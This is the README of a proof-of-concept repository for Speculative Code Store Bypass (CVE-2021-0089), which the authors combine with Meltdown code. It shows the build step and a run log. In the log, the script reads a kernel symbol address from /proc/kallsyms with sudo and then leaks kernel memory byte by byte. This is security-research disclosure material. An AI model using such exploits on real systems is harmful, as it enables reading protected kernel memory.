# Speculative Code Store Bypass POC
Speculative Code Store Bypass Vulnerability Proof-of-Concept

# Description
Speculative Code Store Bypass (SCSB) is a new transient execution attack which exploits the self-modifying code (SMC) mechanism in Intel processor. 
Intel published this vulnerability on 2021-06-08 and assigned it CVE-2021-0089. Look at their explainations for details:
https://software.intel.com/content/www/us/en/develop/articles/software-security-guidance/advisory-guidance/speculative-code-store-bypass.html

We discoverd this vulnerability a long time ago and always used it as a novel way to suppress the fault in Meltdown-type attack. This POC is a demonstration. It is a little pity that we fail to disclose it in the first place :(. 
 
The Meltdown code borrowed in this POC is at:
https://github.com/paboldin/meltdown-exploit

# Result
```
$ make
gcc -O3 -o scsb scsb.c

$ ./run.sh 
looking for linux_proc_banner in /proc/kallsyms
protected. requires root
+ find_linux_proc_banner /proc/kallsyms sudo
+ sudo sed -n -re s/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_proc_banner$/\1/p /proc/kallsyms
+ linux_proc_banner=ffffffff81800060
+ set +x
cached = 158, uncached = 404, threshold 208
read 25 % (score=913/1000)
read 73 s (score=904/1000)
read 20   (score=869/1000)
read 76 v (score=850/1000)
read 65 e (score=839/1000)
read 72 r (score=933/1000)
read 73 s (score=864/1000)
read 69 i (score=897/1000)
read 6f o (score=867/1000)
read 6e n (score=861/1000)
read 20   (score=789/1000)
read 25 % (score=809/1000)
read 73 s (score=883/1000)
read 20   (score=703/1000)
read 28 ( (score=856/1000)
read 62 b (score=774/1000)
read 75 u (score=770/1000)
read 69 i (score=682/1000)
read 6c l (score=856/1000)
read 64 d (score=698/1000)
read 64 d (score=776/1000)
read 40 @ (score=850/1000)
read 6c l (score=683/1000)
read 67 g (score=846/1000)
read 77 w (score=755/1000)
read 30 0 (score=725/1000)
read 31 1 (score=830/1000)
read 2d - (score=827/1000)
read 34 4 (score=766/1000)
read 33 3 (score=791/1000)
read 29 ) (score=736/1000)
read 20   (score=699/1000)
```
